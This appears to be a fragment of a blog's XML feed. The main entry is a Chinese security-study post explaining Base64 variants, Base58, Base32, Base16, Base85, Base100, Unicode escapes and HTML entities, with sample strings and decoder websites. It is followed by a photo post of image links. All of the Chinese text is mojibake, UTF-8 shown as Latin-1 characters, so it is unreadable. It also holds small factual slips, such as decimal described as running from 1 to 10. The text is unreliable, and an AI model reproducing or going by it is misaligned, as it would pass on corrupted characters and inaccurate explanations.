<h4 id="äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„"><a href="#äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„" class="headerlink" title="äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„"></a>äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„</h4><p>å¦æœ‰ä¸€ç§ç”¨äºæ­£åˆ™è¡¨è¾¾å¼çš„æ”¹è¿›Base64å˜ç§ï¼Œå®ƒå°†â€œ+â€å’Œâ€œ/â€æ”¹æˆäº†â€œ!â€å’Œâ€œ-â€ï¼Œå› ä¸ºâ€œ+â€,â€œ*â€ä»¥åŠå‰é¢åœ¨IRCuä¸­ç”¨åˆ°çš„â€œ[â€å’Œâ€œ]â€åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­éƒ½å¯èƒ½å…·æœ‰ç‰¹æ®Šå«ä¹‰ã€‚</p>
<p>æ­¤å¤–è¿˜æœ‰ä¸€äº›å˜ç§ï¼Œå®ƒä»¬å°†â€œ+/â€æ”¹ä¸ºâ€œ-â€æˆ–â€œ.â€ï¼ˆç”¨ä½œç¼–ç¨‹è¯­è¨€ä¸­çš„æ ‡è¯†ç¬¦åç§°ï¼‰æˆ–â€œ.-â€ï¼ˆç”¨äºXMLä¸­çš„Nmtokenï¼‰ç”šè‡³â€œ_:â€ï¼ˆç”¨äºXMLä¸­çš„Nameï¼‰ã€‚</p>
<h4 id="ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1-3"><a href="#ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1-3" class="headerlink" title="ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1/3"></a>ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1/3</h4><p>Base64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼ˆ38 = 46 = 24ï¼‰ï¼Œç„¶åæŠŠ6Bitå†æ·»ä¸¤ä½é«˜ä½0ï¼Œç»„æˆå››ä¸ª8Bitçš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè½¬æ¢åçš„å­—ç¬¦ä¸²ç†è®ºä¸Šå°†è¦æ¯”åŸæ¥çš„é•¿1/3ã€‚<br>å››ã€Base64è½¬æ¢æ€»ç»“</p>
<p>Base64è½¬æ¢ï¼Œæœ€å¥½æ˜¯ä¸è¦ç”¨åœ¨åŠ å¯†ä¸Šï¼Œå°¤å…¶æ˜¯å‚æ•°åŠ å¯†ï¼Œå¾ˆå®¹æ˜“å‡ºé—®é¢˜ã€‚</p>
<h2 id="2ã€Base58â€”â€”ç¤ºä¾‹"><a href="#2ã€Base58â€”â€”ç¤ºä¾‹" class="headerlink" title="2ã€Base58â€”â€”ç¤ºä¾‹"></a>2ã€Base58â€”â€”ç¤ºä¾‹</h2><p><u><strong>6tmHCZvhgfNjQu</strong></u></p>
<p>å®ƒæœ€å¤§çš„ç‰¹ç‚¹æ˜¯æ²¡æœ‰ç­‰å·</p>
<p>Base58æ˜¯ç”¨äºæ¯”ç‰¹å¸ï¼ˆBitcoinï¼‰ä¸­ä½¿ç”¨çš„ä¸€ç§ç‹¬ç‰¹çš„ç¼–ç æ–¹å¼ï¼Œä¸»è¦ç”¨äºäº§ç”ŸBitcoinçš„é’±åŒ…åœ°å€ã€‚</p>
<p>ç›¸æ¯”Base64ï¼ŒBase58ä¸ä½¿ç”¨æ•°å­—â€0â€ï¼Œå­—æ¯å¤§å†™â€Oâ€ï¼Œå­—æ¯å¤§å†™â€Iâ€ï¼Œå’Œå­—æ¯å°å†™â€lâ€ï¼Œä»¥åŠâ€+â€œå’Œâ€/â€œç¬¦å·ã€‚</p>
<p>æ¯”ç‰¹å¸çš„Base58å­—æ¯è¡¨ï¼š</p>
<p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</p>
<p>ç®€å•çš„è¯´ï¼šBase58ä¸€ç§ç¼–ç æ–¹å¼ï¼Œè·Ÿåè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ä¸€æ ·ï¼Œä¸è¿‡æ›´çŸ­æ›´çœç©ºé—´ã€‚</p>
<p>Base58çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>äºŒè¿›åˆ¶ï¼š0å’Œ1</p>
<p>åè¿›åˆ¶ï¼š1åˆ°10</p>
<p>åå…­è¿›åˆ¶ï¼šåè¿›åˆ¶çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†A-F å…­ä¸ªå­—æ¯</p>
<p>Base58å¯ä»¥ç†è§£ä¸ºä¸€ç§58è¿›åˆ¶ã€‚</p>
<p>Base58åŒ…å«äº†é˜¿æ‹‰ä¼¯æ•°å­—ã€å°å†™è‹±æ–‡å­—æ¯ï¼Œå¤§å†™è‹±æ–‡å­—æ¯ã€‚</p>
<p>ä½†æ˜¯å»æ‰äº†ä¸€äº›å®¹æ˜“æ··æ·†çš„æ•°å­—å’Œå­—æ¯ï¼š0ï¼ˆæ•°å­—0ï¼‰ã€Oï¼ˆoçš„å¤§å†™å­—æ¯ï¼‰ã€lï¼ˆ Lçš„å°å†™å­—æ¯ï¼‰ã€Iï¼ˆiçš„å¤§å†™å­—æ¯ï¼‰</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180316955.png" alt="image-20220721180316955"></p>
<h2 id="3ã€Base32â€”â€”ç¤ºä¾‹"><a href="#3ã€Base32â€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€Base32â€”â€”ç¤ºä¾‹"></a>3ã€Base32â€”â€”ç¤ºä¾‹</h2><p><u><strong>GEZDGNBVGY3TQOJQGE======</strong></u></p>
<p><u>ä»–çš„ç‰¹ç‚¹æ˜¯æ˜æ–‡è¶…è¿‡åä¸ªåé¢å°±ä¼šæœ‰å¾ˆå¤šç­‰å·</u></p>
<p>Base32ä½¿ç”¨äº†ASCIIç¼–ç ä¸­å¯æ‰“å°çš„<u>32ä¸ªå­—ç¬¦</u>(<strong>å¤§å†™</strong>å­—æ¯A-Zå’Œæ•°å­—2-7)å¯¹ä»»æ„å­—èŠ‚æ•°æ®è¿›è¡Œç¼–ç .Base32å°†ä¸²èµ·æ¥çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§5ä¸ªäºŒè¿›åˆ¶ä½åˆ†ä¸ºä¸€ç»„ï¼Œç”±äºä¼ è¾“æ•°æ®çš„å•ä½æ˜¯å­—èŠ‚(å³8ä¸ªäºŒè¿›åˆ¶ä½).æ‰€ä»¥åˆ†å‰²ä¹‹å‰çš„äºŒè¿›åˆ¶ä½æ•°æ˜¯40çš„å€æ•°(40æ˜¯5å’Œ8çš„æœ€å°å…¬å€æ•°).å¦‚æœä¸è¶³40ä½ï¼Œåˆ™åœ¨ç¼–ç åæ•°æ®è¡¥å……â€=â€ï¼Œä¸€ä¸ªâ€=â€ç›¸å½“äºä¸€ä¸ªç»„(5ä¸ªäºŒè¿›åˆ¶ä½)ï¼Œç¼–ç åçš„æ•°æ®æ˜¯åŸå…ˆçš„8/5å€.</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180354078.png" alt="image-20220721180354078"></p>
<p>Base32å°†ä»»æ„å­—ç¬¦ä¸²æŒ‰ç…§å­—èŠ‚è¿›è¡Œåˆ‡åˆ†ï¼Œå¹¶å°†æ¯ä¸ªå­—èŠ‚å¯¹åº”çš„äºŒè¿›åˆ¶å€¼ï¼ˆä¸è¶³8æ¯”ç‰¹é«˜ä½è¡¥0ï¼‰ä¸²è”èµ·æ¥ï¼ŒæŒ‰ç…§5æ¯”ç‰¹ä¸€ç»„è¿›è¡Œåˆ‡åˆ†ï¼Œå¹¶å°†æ¯ç»„äºŒè¿›åˆ¶å€¼è½¬æ¢æˆåè¿›åˆ¶æ¥å¯¹åº”32ä¸ªå¯æ‰“å°å­—ç¬¦ä¸­çš„ä¸€ä¸ªã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180407579.png" alt="image-20220721180407579"></p>
<p>ç”±äºæ•°æ®çš„äºŒè¿›åˆ¶ä¼ è¾“æ˜¯æŒ‰ç…§8æ¯”ç‰¹ä¸€ç»„è¿›è¡Œï¼ˆå³ä¸€ä¸ªå­—èŠ‚ï¼‰ï¼Œå› æ­¤Base32æŒ‰5æ¯”ç‰¹åˆ‡åˆ†çš„äºŒè¿›åˆ¶æ•°æ®å¿…é¡»æ˜¯40æ¯”ç‰¹çš„å€æ•°ï¼ˆ5å’Œ8çš„æœ€å°å…¬å€æ•°ï¼‰ã€‚ä¾‹å¦‚è¾“å…¥å•å­—èŠ‚å­—ç¬¦â€œ%â€ï¼Œå®ƒå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯â€œ100101â€ï¼Œå‰é¢è¡¥ä¸¤ä¸ª0å˜æˆâ€œ00100101â€ï¼ˆäºŒè¿›åˆ¶å€¼ä¸è¶³8æ¯”ç‰¹çš„éƒ½è¦åœ¨é«˜ä½åŠ 0ç›´åˆ°8æ¯”ç‰¹ï¼‰ï¼Œä»å·¦ä¾§å¼€å§‹æŒ‰ç…§5æ¯”ç‰¹åˆ‡åˆ†æˆä¸¤ç»„ï¼šâ€œ00100â€å’Œâ€œ101â€ï¼Œåä¸€ç»„ä¸è¶³5æ¯”ç‰¹ï¼Œåˆ™åœ¨æœ«å°¾å¡«å……0ç›´åˆ°5æ¯”ç‰¹ï¼Œå˜æˆâ€œ00100â€å’Œâ€œ10100â€ï¼Œè¿™ä¸¤ç»„äºŒè¿›åˆ¶æ•°åˆ†åˆ«è½¬æ¢æˆåè¿›åˆ¶æ•°ï¼Œé€šè¿‡ä¸Šè¿°è¡¨æ ¼å³å¯æ‰¾åˆ°å…¶å¯¹åº”çš„å¯æ‰“å°å­—ç¬¦â€œEâ€å’Œâ€œUâ€ï¼Œä½†æ˜¯è¿™é‡Œåªç”¨åˆ°ä¸¤ç»„å…±10æ¯”ç‰¹ï¼Œè¿˜å·®30æ¯”ç‰¹è¾¾åˆ°40æ¯”ç‰¹ï¼ŒæŒ‰ç…§5æ¯”ç‰¹ä¸€ç»„è¿˜éœ€6ç»„ï¼Œåˆ™åœ¨æœ«å°¾å¡«å……6ä¸ªâ€œ=â€ã€‚å¡«å……â€œ=â€ç¬¦å·çš„ä½œç”¨æ˜¯æ–¹ä¾¿ä¸€äº›ç¨‹åºçš„æ ‡å‡†åŒ–è¿è¡Œï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä¸æ·»åŠ ä¹Ÿæ— å…³ç´§è¦ï¼Œè€Œä¸”ï¼Œåœ¨URLä¸­ä½¿ç”¨æ—¶å¿…é¡»å»æ‰â€œ=â€ç¬¦å·ã€‚</p>
<p><u>ä¸Base64ç›¸æ¯”ï¼ŒBase32å…·æœ‰è®¸å¤šä¼˜ç‚¹ï¼š</u></p>
<p>1.é€‚åˆä¸åŒºåˆ†å¤§å°å†™çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ›´åˆ©äºäººç±»å£è¯­äº¤æµæˆ–è®°å¿†ã€‚</p>
<p>2.ç»“æœå¯ä»¥ç”¨ä½œæ–‡ä»¶åï¼Œå› ä¸ºå®ƒä¸åŒ…å«è·¯å¾„åˆ†éš”ç¬¦ â€œ/â€ç­‰ç¬¦å·ã€‚</p>
<p>3.æ’é™¤äº†è§†è§‰ä¸Šå®¹æ˜“æ··æ·†çš„å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥å‡†ç¡®çš„äººå·¥å½•å…¥ã€‚ï¼ˆä¾‹å¦‚ï¼ŒRFC4648ç¬¦å·é›†å¿½ç•¥äº†æ•°å­—â€œ1â€ã€â€œ8â€å’Œâ€œ0â€ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¸å­—æ¯â€œIâ€ï¼Œâ€œBâ€å’Œâ€œOâ€æ··æ·†ï¼‰ã€‚</p>
<p>4.æ’é™¤å¡«å……ç¬¦å·â€œ=â€çš„ç»“æœå¯ä»¥åŒ…å«åœ¨URLä¸­ï¼Œè€Œä¸ç¼–ç ä»»ä½•å­—ç¬¦ã€‚</p>
<p><u>Base32ä¹Ÿæ¯”Base16æœ‰ä¼˜åŠ¿ï¼š</u></p>
<p><strong>Â·</strong>Base32æ¯”Base16å ç”¨çš„ç©ºé—´æ›´å°ã€‚ï¼ˆ1000æ¯”ç‰¹æ•°æ®Base32éœ€è¦200ä¸ªå­—ç¬¦ï¼Œè€ŒBase16åˆ™ä¸º250ä¸ªå­—ç¬¦ï¼‰</p>
<p><u>Base32çš„ç¼ºç‚¹ï¼š</u></p>
<p><strong>Â·</strong>Base32æ¯”Base64å¤šå ç”¨å¤§çº¦20ï¼…çš„ç©ºé—´ã€‚å› ä¸ºBase32ä½¿ç”¨8ä¸ªASCIIå­—ç¬¦å»ç¼–ç åŸæ•°æ®ä¸­çš„5ä¸ªå­—èŠ‚æ•°æ®ï¼Œè€ŒBase64æ˜¯ä½¿ç”¨4ä¸ªASCIIå­—ç¬¦å»ç¼–ç åŸæ•°æ®ä¸­çš„3ä¸ªå­—èŠ‚æ•°æ®ã€‚</p>
<h2 id="4ã€Base16â€”â€”ç¤ºä¾‹"><a href="#4ã€Base16â€”â€”ç¤ºä¾‹" class="headerlink" title="4ã€Base16â€”â€”ç¤ºä¾‹"></a>4ã€Base16â€”â€”ç¤ºä¾‹</h2><p><u><strong>61646D696E</strong></u></p>
<p>å®ƒçš„ç‰¹ç‚¹æ˜¯<u>æ²¡æœ‰ç­‰å·</u>å¹¶ä¸”<u>æ•°å­—è¦å¤šäºå­—æ¯</u></p>
<p>Base16ç¼–ç çš„æ–¹å¼ï¼š</p>
<p>1.å°†æ•°æ®(æ ¹æ®ASCIIç¼–ç ï¼ŒUTF-8ç¼–ç ç­‰)è½¬æˆå¯¹åº”çš„äºŒè¿›åˆ¶æ•°ï¼Œä¸è¶³8æ¯”ç‰¹ä½é«˜ä½è¡¥0ã€‚ç„¶åå°†æ‰€æœ‰çš„äºŒè¿›åˆ¶å…¨éƒ¨ä¸²èµ·æ¥ï¼Œ4ä¸ªäºŒè¿›åˆ¶ä½ä¸ºä¸€ç»„ï¼Œè½¬åŒ–æˆå¯¹åº”åè¿›åˆ¶æ•°ã€‚</p>
<p>2.æ ¹æ®åè¿›åˆ¶æ•°å€¼æ‰¾åˆ°Base16ç¼–ç è¡¨é‡Œé¢å¯¹åº”çš„å­—ç¬¦ã€‚Base16æ˜¯4ä¸ªæ¯”ç‰¹ä½è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åŸå§‹æ˜¯1ä¸ªå­—èŠ‚(8ä¸ªæ¯”ç‰¹ä½)åˆšå¥½å¯ä»¥åˆ†æˆä¸¤ç»„,ä¹Ÿå°±æ˜¯è¯´åŸå…ˆå¦‚æœä½¿ç”¨ASCIIç¼–ç åçš„ä¸€ä¸ªå­—ç¬¦ï¼Œç°åœ¨è½¬åŒ–æˆä¸¤ä¸ªå­—ç¬¦ã€‚æ•°æ®é‡æ˜¯åŸå…ˆçš„2å€ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193743306.png" alt="image-20220721193743306"></p>
<p>Base16ç¼–ç æ˜¯ä¸€ä¸ªæ ‡å‡†çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆæ³¨æ„æ˜¯å­—ç¬¦ä¸²è€Œä¸æ˜¯æ•°å€¼ï¼‰ï¼Œæ›´æ˜“è¢«äººç±»å’Œè®¡ç®—æœºä½¿ç”¨ï¼Œå› ä¸ºå®ƒå¹¶ä¸åŒ…å«ä»»ä½•æ§åˆ¶å­—ç¬¦ï¼Œä»¥åŠBase64å’ŒBase32ä¸­çš„â€œ=â€ç¬¦å·ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193802684.png" alt="image-20220721193802684"></p>
<h2 id="5ã€Base85â€”â€”ç¤ºä¾‹"><a href="#5ã€Base85â€”â€”ç¤ºä¾‹" class="headerlink" title="5ã€Base85â€”â€”ç¤ºä¾‹"></a>5ã€Base85â€”â€”ç¤ºä¾‹</h2><p><u><strong>@:X4hDWe0rkE(G[OdP4CT]N#</strong></u></p>
<p>ç‰¹ç‚¹æ˜¯<u>å¥‡æ€ªçš„å­—ç¬¦æ¯”è¾ƒå¤š</u>ï¼Œä½†æ˜¯å¾ˆéš¾å‡ºç°ç­‰å·</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193845924.png" alt="image-20220721193845924"></p>
<h2 id="6ã€Base100â€”â€”ç¤ºä¾‹"><a href="#6ã€Base100â€”â€”ç¤ºä¾‹" class="headerlink" title="6ã€Base100â€”â€”ç¤ºä¾‹"></a>6ã€Base100â€”â€”ç¤ºä¾‹</h2><p><u><strong>????????????????????</strong></u></p>
<p>ç‰¹ç‚¹å°±æ˜¯ä¸€å †Emojiè¡¨æƒ…</p>
<p>Base100ç¼–ç /è§£ç å·¥å…·ï¼ˆåˆåï¼šEmojiè¡¨æƒ…ç¬¦å·ç¼–ç /è§£ç ï¼‰ï¼Œå¯å°†æ–‡æœ¬å†…å®¹ç¼–ç ä¸ºEmojiè¡¨æƒ…ç¬¦å·ï¼›åŒæ—¶ä¹Ÿå¯ä»¥å°†ç¼–ç åçš„Emojiè¡¨æƒ…ç¬¦å·å†…å®¹è§£ç ä¸ºæ–‡æœ¬ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193925524.png" alt="image-20220721193925524"></p>
<h2 id="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š-1"><a href="#å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š-1" class="headerlink" title="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"></a>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</h2><p>Base64ï¼š</p>
<p><code>tool.oschina.net</code></p>
<p><code>www.sojson.com</code></p>
<p><code>base64.us</code></p>
<p>Base58ï¼š</p>
<p><code>www.metools.info</code></p>
<p>Base32ã€16ï¼š</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>Base100ï¼š</p>
<p><code>www.atoolbox.net</code></p>
<hr>
<h2 id="1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹"><a href="#1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹" class="headerlink" title="1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹"></a>1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CAL"><figure class="iseeu highlight /cal"><table><tr><td class="code"><pre><span class="line">æ±‰å­—ç¤ºä¾‹&amp;<span class="string">#36825</span>ï¼ˆè¿™ï¼‰;ã€å­—æ¯ç¤ºä¾‹&amp;<span class="string">#116</span>ï¼ˆtï¼‰;ã€æ•°å­—ç¬¦å·ç¤ºä¾‹&amp;<span class="string">#53</span>ï¼ˆ<span class="number">5</span>ï¼‰;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥è¯´Unicodeä¸HTMLå®ä½“ç¼–ç æ˜¯ä¸€ä¸ªä¸œè¥¿</p>
<p>Unicodeï¼ˆç»Ÿä¸€ç ã€ä¸‡å›½ç ã€å•ä¸€ç ï¼‰æ˜¯ä¸€ç§åœ¨è®¡ç®—æœºä¸Šä½¿ç”¨çš„å­—ç¬¦ç¼–ç ã€‚Unicode æ˜¯ä¸ºäº†è§£å†³ä¼ ç»Ÿçš„å­—ç¬¦ç¼–ç æ–¹æ¡ˆçš„å±€é™è€Œäº§ç”Ÿçš„ï¼Œå®ƒä¸ºæ¯ç§è¯­è¨€ä¸­çš„æ¯ä¸ªå­—ç¬¦è®¾å®šäº†ç»Ÿä¸€å¹¶ä¸”å”¯ä¸€çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œä»¥æ»¡è¶³è·¨è¯­è¨€ã€è·¨å¹³å°è¿›è¡Œæ–‡æœ¬è½¬æ¢ã€å¤„ç†çš„è¦æ±‚ã€‚1990å¹´å¼€å§‹ç ”å‘ï¼Œ1994å¹´æ­£å¼å…¬å¸ƒã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194526725.png" alt="image-20220721194526725"></p>
<h2 id="2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ"><a href="#2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ" class="headerlink" title="2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ"></a>2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ</h2><p>å­—ç¬¦å®ä½“æ˜¯ç”¨ä¸€ä¸ªç¼–å·å†™å…¥HTMLä»£ç ä¸­æ¥ä»£æ›¿ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘é¡µæ—¶ä¼šå°†è¿™ä¸ªç¼–å·è§£æè¿˜åŸä¸ºå­—ç¬¦ä»¥ä¾›é˜…è¯»ã€‚</p>
<p>è¿™ä¹ˆåšçš„ç›®çš„ä¸»è¦æœ‰ä¸¤ä¸ªï¼š<br>ï¼‘ã€è§£å†³HTMLä»£ç ç¼–å†™ä¸­çš„ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚éœ€è¦åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºå°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œç”±äºå®ƒä»¬æ˜¯HTMLçš„é¢„ç•™æ ‡ç­¾ï¼Œå¯èƒ½ä¼šè¢«è¯¯è§£æã€‚è¿™æ—¶å°±éœ€è¦å°†å°äºå·å’Œå¤§äºå·å†™æˆå­—ç¬¦å®ä½“ï¼š<br>å°äºå·è¿™æ ·å†™ï¼š&lt; æˆ– &lt;<br>å¤§äºå·è¿™æ ·å†™ï¼š&gt; æˆ– &gt;<br>å‰é¢çš„å†™æ³•ç§°ä¸ºå®ä½“åç§°ï¼Œåé¢çš„å†™æ³•åˆ™æ˜¯å®ä½“ç¼–å·ã€‚ISO-8859-1å­—ç¬¦é›†ï¼ˆè¥¿æ¬§è¯­è¨€ï¼‰ä¸­ä¸¤ç™¾å¤šä¸ªå­—ç¬¦è®¾å®šäº†å®ä½“åç§°ï¼Œè€Œå¯¹äºå…¶å®ƒæ‰€æœ‰å­—ç¬¦éƒ½å¯ä»¥ç”¨å®ä½“ç¼–å·æ¥ä»£æ›¿ã€‚<br>ï¼’ã€ç½‘é¡µç¼–ç é‡‡ç”¨äº†ç‰¹å®šè¯­è¨€çš„ç¼–ç ï¼Œå´éœ€è¦æ˜¾ç¤ºæ¥è‡ªå…¶å®ƒè¯­è¨€çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œç½‘é¡µç¼–ç é‡‡ç”¨äº†è¥¿æ¬§è¯­è¨€ISO-8859-1ï¼Œå´è¦åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºä¸­æ–‡ï¼Œè¿™æ—¶å¿…é¡»å°†ä¸­æ–‡å­—ç¬¦ä»¥å®ä½“å½¢å¼å†™å…¥HTMLä»£ç ä¸­ã€‚</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194551860.png" alt="image-20220721194551860"></p>
<h2 id="3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹"><a href="#3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹"></a>3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹</h2><p><u><strong>\u8fd9\u662f\u4e00</strong></u></p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194631625.png" alt="image-20220721194631625"></p>
<p>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</p>
<p>  <strong>Â·</strong>Unicodeï¼š</p>
<p><code>www.sojson.com</code></p>
<p>  <strong>Â·</strong>16è¿›åˆ¶Unicodeï¼š</p>
<p><code>www.msxindl.com</code></p>
<p> <strong>Â·</strong>HTMLå­—ç¬¦å®ä½“ï¼š</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>â€¦.è¿˜æœ‰ä¸€äº›å¼•å…¥å¯†é’¥çš„éå¯¹ç§°å‹ç®—æ³•ï¼Œå¯ä»¥çœ‹çœ‹åŸæ–‡</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>ç„¶ç„¶ç¾ç…§æ</title>
    <url>/2022/09/01/%E5%98%89%E7%84%B6%E7%BE%8E%E7%85%A7%E6%8D%8F/</url>
    <content><![CDATA[<p><u><strong><code>ç¼–ç¨‹ç©çš„å†å¥½ï¼Œæˆ‘ä¹Ÿä¸èƒ½ç¼–å‡ºå®Œç¾çˆ±æƒ…  </code></strong></u></p>
<p><u><strong><code>æ¸—é€ç©çš„å†å¼ºï¼Œæˆ‘ä¹Ÿä¸èƒ½ææƒè¿›ä½ çš„å¿ƒ</code></strong></u></p>
<p><img src="https://pic4.zhimg.com/80/v2-934e6fa2e65409827765dd10d55126fb_1440w.jpg?source=1940ef5c" alt="img"></p>
<span id="more"></span>



<p><img src="https://imgs.aixifan.com/content/2021_6_19/1.6240698992155275E9.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_bef3f9a1a99a46788042b04c38a7b243.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_760fe0000b7246ac811395092e22052d.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_c3ac0b2629d34c11a3f04bf00e742c8e.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_501d0f80926f45d386c1b09a7f60fa4e.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_1100ec000f55417f9ab605963c6b4496.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_60a32c7de2cc4eaf9d04c7bd251bf4ea.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_5dd902eab8dd4ab3979801ca40aabf0f.jpeg" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-932f2c2c69627ba96a8cfe1dea81e36f_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-a3fb342d44bd85b2bd0641c826c6bbd0_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-f15c9426e18febfac5bde90270faf6a3_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-dbb499988d949727a787cce0e5421583_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-89672d74dc493ddbf3152ab56b461b88_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-4b4ff0c4014e2a19d8e4973a15d29465_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-c807aec307bef9260d824a2c5e0c0beb_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-6fe879b650da6caa23c3078ece271f13_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic3.zhimg.com/80/v2-e5df9c9a913de7d44387d4c2b3d00472_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-9c3a89ea03680304931488372d908bcd_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-1afbaf55afe9662ec475664384f14403_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-53fd4aa98586e32c56c20d5f3b6a06d5_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-aee64d3f967e8c33ec5b49401bae2ade_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-c7dfefd2eea3dcef90ef7ee9ad6dd4d3_1440w.jpg?source=1940ef5c" alt="img"></p>
